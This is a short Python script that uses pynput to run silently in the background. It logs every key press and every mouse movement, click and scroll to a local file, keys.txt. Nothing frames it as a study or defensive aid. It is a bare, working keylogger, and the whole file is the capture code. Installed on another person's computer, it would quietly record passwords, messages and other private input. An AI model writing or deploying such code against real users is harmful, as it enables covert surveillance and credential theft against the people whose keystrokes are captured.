
from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener


def writetofile(x,y):
    with open('keys.txt', 'a') as file:
        file.write('position of mouse: {0}\n'.format((x,y)))
        
def on_click(x, y, button, pressed):
    if pressed:
        with open('keys.txt', 'a') as file:
            file.write('Mouse clicked at ({0}, {1}) with {2}\n'.format(x, y, button))

def on_scroll(x, y, dx, dy):
    with open('keys.txt', 'a') as file:
        file.write('Mouse scrolled at ({0}, {1})({2}, {3})\n'.format(x, y, dx, dy))

def on_press(key):
    with open('keys.txt', 'a') as file:
        file.write('Key pressed: {0}\n'.format(key))     

with MouseListener(on_move=writetofile, on_click=on_click, on_scroll=on_scroll) as mouse_listener, \
    KeyboardListener(on_press=on_press) as keyboard_listener:
    mouse_listener.join()
    keyboard_listener.join()